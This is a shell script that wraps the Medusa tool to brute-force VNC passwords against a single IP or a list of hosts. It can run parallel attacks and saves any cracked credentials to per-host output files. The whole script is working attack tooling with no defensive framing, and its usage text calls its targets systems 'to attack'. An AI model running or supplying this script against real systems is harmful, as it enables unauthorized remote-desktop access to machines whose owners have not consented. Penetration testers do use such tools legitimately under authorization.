#!/bin/sh

ShowUsage() {
	echo ""
	echo "Usage: $0 [--ftps] [--hostfile=<file> | --host=<host>] <--passwordfile=<passwordfile>"
	echo "$0 attempts to crack vnc sessions with no password or password-only."
	echo "Note that if the server requires username/password, this won't work."
	echo ""
	echo "Required:"
	echo "--host=<host>        IP address of single system to attack"
	echo "--passwordfile=<passwordfile>  Password file to use"
	echo ""
	echo "Optional:"
	echo "--hostfile=<file>     File with list of IP's to attack instead of a single host"
	echo "--help                Usage information."
}

if [ $# -eq 0 ]; then
	ShowUsage
	exit 1
fi

HOSTFILE=""
HOST=""
PASSWORDFILE=""
USERNAME="NoneForVNC"
USERFILE=""
FTPS=0

for i in $*
do
	case $i in
	--ftps)
		FTPS=1
	;;
	--host=*)
		HOST=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--hostfile=*)
		HOSTFILE=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--passwordfile=*)
		PASSWORDFILE=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--userid=*)
		USERNAME=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--userfile=*)
		USERFILE=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--help | *)
		ShowUsage
		exit 1
	;;
	esac
done

# Sanity check...
if [ ${#HOST} -eq 0 -a ${#HOSTFILE} -eq 0 ]; then
	echo "ERROR: Please specify either a host or a host file."
	exit 2
fi

if [ ${#USERNAME} -eq 0 -a ${#USERFILE} -eq 0 ]; then
	echo "ERROR: Please specify either a user name or a user name file."
	exit 2
fi

if [ ${#PASSWORDFILE} -eq 0 ]; then
	echo "ERROR: Please specify a password file."
	exit 2
fi

if [ ! -e $PASSWORDFILE ]; then
	echo "ERROR: file $PASSWORDFILE could not be found."
	exit 3
fi

# Okay, now we're ready to go.
if [ ${#USERFILE} -gt 0 ]; then
	USERPARAM="-U $USERFILE"
else
	USERPARAM="-u $USERNAME"
fi

# Medusa
echo "Running tests..."
# -F = stop after finding combo
# -e ns = try blank and name

if [ ${#HOSTFILE} -gt 0 ]; then
	HOSTLIST=`cat $HOSTFILE | grep -v "^$" | grep -v "^#"`
else
	HOSTLIST=$HOST
fi

NUMHOSTS=`echo "$HOSTLIST" | wc -l`

CREATEDFILE=0

if [ ${#USERFILE} -eq 0 ]; then
	USERFILE="host.$USERNAME.tmp"
	echo "$USERNAME" > host.$USERNAME.tmp
	CREATEDFILE=1
fi


for CURHOST in $HOSTLIST
do
	OUTPUTFILE=`echo "$CURHOST.crack.vnc.txt"`
	DATESTR=`date`

	HOSTPARAM="-h $CURHOST"

	if [ $NUMHOSTS -gt 1 ]; then
		# Parallelizing scans
		echo "[$DATESTR] Spawning vnc brute force for $CURHOST with $PASSWORDFILE [output to $OUTPUTFILE]..."
		echo "[$DATESTR] Spawning vnc brute force for $CURHOST with $PASSWORDFILE..." > $OUTPUTFILE

		medusa $HOSTPARAM $USERPARAM -P $PASSWORDFILE -M vnc -e n -F > $OUTPUTFILE &
	else
		# Run single
		echo "[$DATESTR] Running vnc brute force for $CURHOST with $PASSWORDFILE [output to $OUTPUTFILE]..."
		echo "[$DATESTR] Running vnc brute force for $CURHOST with $PASSWORDFILE..." > $OUTPUTFILE

		medusa $HOSTPARAM $USERPARAM -P $PASSWORDFILE -M vnc -e n -F > $OUTPUTFILE

		DATESTR=`date`
		echo "[$DATESTR] Scan completed.  See $OUTPUTFILE for results."
		echo "[$DATESTR] Scan completed." >> $OUTPUTFILE
	fi
done

if [ $CREATEDFILE -eq 1 ]; then
	rm $USERFILE
fi

